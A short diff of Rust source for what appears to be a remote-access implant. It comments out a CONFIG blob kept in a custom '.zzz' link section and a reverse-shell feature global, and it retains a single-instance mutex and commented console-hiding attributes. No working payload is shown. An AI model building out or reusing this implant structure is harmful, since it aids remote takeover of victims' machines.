@@ -1,9 +1,10 @@
+pub mod globals;
 // #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 // #![cfg_attr(debug_assertions, windows_subsystem = "windows")]
 
 #[no_mangle]
 #[link_section = ".zzz"]
-static CONFIG: [u8; 1024] = [0; 1024];
+// static CONFIG: [u8; 1024] = [0; 1024];
 
 use std::time::Duration;
 
@@ -28,9 +29,9 @@ static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
     Mutex::new(service::mutex::MutexLock::new())
 );
 
-static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
-    Mutex::new(features::reverse_shell::ReverseShell::new())
-);
+// static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
+//     Mutex::new(features::reverse_shell::ReverseShell::new())
+// );
 
 #[tokio::main(flavor = "current_thread")]
 async fn main() {
